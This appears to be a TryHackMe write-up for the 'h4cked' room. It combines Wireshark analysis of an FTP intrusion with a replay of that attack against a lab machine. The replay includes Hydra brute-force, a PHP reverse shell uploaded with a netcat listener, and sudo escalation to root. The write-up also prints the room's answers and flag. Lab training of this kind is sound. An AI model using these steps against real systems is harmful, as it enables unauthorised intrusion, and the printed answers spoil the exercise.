# [h4cked](https://tryhackme.com/room/h4cked) - TryHackMe Writeup

Platform: ![TryHackMe](https://img.shields.io/badge/TryHackMe-1abc9c?style=flat-square) |  Difficulty: Easy | Perspective: Attacker

          Category: Digital Forensics / Penetration Testing
          Tools Used: Wireshark, Hydra, Netcat, FTP client
          
---

## Task 1: Oh no! We've been hacked!

We're given a .pcap file from the attack and tasked with figuring out what happened using Wireshark.

### Q1: Download the .pcap file and view it in Wireshark.

Answer:No Answer Needed

### Q2: The attacker is trying to log into a specific service. What service is this? 

Answer: FTP

Inspecting the capture in Wireshark, we can see the attacker attempting to authenticate over the FTP service.

<img width="1100" height="199" alt="image" src="https://github.com/user-attachments/assets/f88247be-ad43-45cd-b736-6c391974d341" />

### Q3: There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?

Answer: Hydra

A quick Google search for "Van Hauser brute force tool" confirms the answer, Hydra is a widely used network login cracker.

### Q4: The attacker is trying to log on with a specific username. What is the username?

Answer: jenny

Looking through the FTP packets in Wireshark, we can see repeated login attempts using the username jenny.

<img width="981" height="86" alt="image" src="https://github.com/user-attachments/assets/3d4b9324-9c58-4a26-a366-6ad09621f2f0" />

### Q5: What is the user's password?

Answer: password123

Following the FTP stream, we can spot a successful login. The password used was password123.

<img width="1100" height="68" alt="image" src="https://github.com/user-attachments/assets/a3ddccdb-1aa8-4dc6-8e6f-9042bb3c7a04" />

### Q6: What is the current FTP working directory after the attacker logged in?

Answer: /var/www/html

Opening packet 401 reveals all the session details, including the working directory the attacker landed in after logging in.

<img width="497" height="349" alt="image" src="https://github.com/user-attachments/assets/dec4dc4b-53d7-4335-868f-f2aadbd2d9f0" />

### Q7: The attacker uploaded a backdoor. What is the backdoor's filename?

Answer: shell.php

Continuing through the FTP stream, we see the attacker uploading a file called shell.php to the web root.

<img width="951" height="740" alt="image" src="https://github.com/user-attachments/assets/354a72ac-0df4-4581-aba3-8fa449e63e66" />

### Q8: The backdoor can be downloaded from a specific URL inside the uploaded file. What is the full URL?

Answer: http://pentestmonkey.net/tools/php-reverse-shell

By following the TCP streams in Wireshark, we find the contents of shell.php, which references the reverse shell script hosted at the Pentest Monkey website.

<img width="1100" height="715" alt="image" src="https://github.com/user-attachments/assets/12f663d7-fb88-426b-9029-b5f2e38e21e5" />

### Q9: Which command did the attacker manually execute after getting a reverse shell?

Answer: whoami

Following the relevant stream, we can see the attacker's first command after gaining shell access was whoami, which is used to confirm execution context.

<img width="1093" height="255" alt="image" src="https://github.com/user-attachments/assets/fc6ca723-446c-4b44-81ec-59597728ce99" />

### Q10: What is the computer's hostname?

Answer: wir3

The hostname wir3 is visible in the shell session output captured in the same stream.

<img width="165" height="29" alt="image" src="https://github.com/user-attachments/assets/5bd738cf-2e90-478a-8523-b2d3f01a5ab8" />

### Q11: Which command did the attacker execute to spawn a new TTY shell?

Answer: python3 -c 'import pty; pty.spawn("/bin/bash")'

The attacker upgraded their basic shell to a full TTY using Python's pty module. 

<img width="440" height="46" alt="image" src="https://github.com/user-attachments/assets/61b6b33f-07d9-4465-950f-99654b890e1b" />

### Q12: Which command was executed to gain a root shell?

Answer: sudo su

After spawning a TTY, the attacker simply ran sudo su to escalate to root.

### Q13: The attacker downloaded something from GitHub. What is the name of the GitHub project?

Answer: Reptile

The stream shows the attacker cloning a GitHub project called Reptile.

### Q14: This project is used to install a stealthy backdoor. What type of backdoor is this?

Answer: Rootkit

A quick Google search for "Reptile GitHub" confirms it is a Linux rootkit (a type of malware designed to be extremely difficult to detect).

---

## Task 2: Hack Your Way Back In

The attacker has changed jenny's password. Our job is to replicate the attacker's steps and retrieve the flag located at /root/Reptile/flag.txt.

### Q1: Deploy the machine

Answer: No Answer Needed

### Q2: Run Hydra on the FTP service to crack jenny's new password.

Answer: No Answer Needed

           hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://<The machine IP provided>

Hydra cracks the password as 987654321.

<img width="990" height="226" alt="image" src="https://github.com/user-attachments/assets/efb9c16c-7064-4eb4-a7ec-a32c36420fe0" />

### Q3: Modify and upload the web shell.

Answer: No Answer Needed

Log into FTP with the cracked credentials and download the existing files:

                       ftp <the machine IP provided>
                       # Username: jenny | Password: 987654321

                       get shell.php
                       get index.html
                       

Edit shell.php. Update the $ip variable to your attacker machine's IP (find it with ifconfig) and set $port to your chosen listener port.
Then re-upload the modified shell:

          put shell.php


### Q4: Start a listener and execute the shell

Answer: No Answer Needed

On your attacker machine:

          nc -lvnp <port>

Then visit the following URL in your browser to trigger the reverse shell:

         http://<the machine IP provided>/shell.php

Your listener should catch the connection.

### Q5: Become root

Answer: No Answer Needed

Check sudo privileges:

         sudo -l

The output shows we can run any command — so escalate with:

        sudo su


### Q6: Read the flag

        cat /root/Reptile/flag.txt

Answer: ebcefd66ca4b559d17b440b6e67fd0fd     

<img width="395" height="390" alt="image" src="https://github.com/user-attachments/assets/38ec3739-528f-4b36-bc1d-fd5ad75b9148" />



<img width="1100" height="658" alt="image" src="https://github.com/user-attachments/assets/8bc58b1e-62c7-4c5e-aa0a-452272e86912" />

---

## Summary

In this room, we:

- Analysed a .pcap file in Wireshark to reconstruct an FTP brute-force attack and subsequent intrusion
  
- Identified the tools, credentials, and commands used by the attacker
  
- Replicated the attack by brute-forcing FTP with Hydra, uploading a PHP reverse shell, escalating to root with sudo su, and reading the flag from the Reptile rootkit directory
         
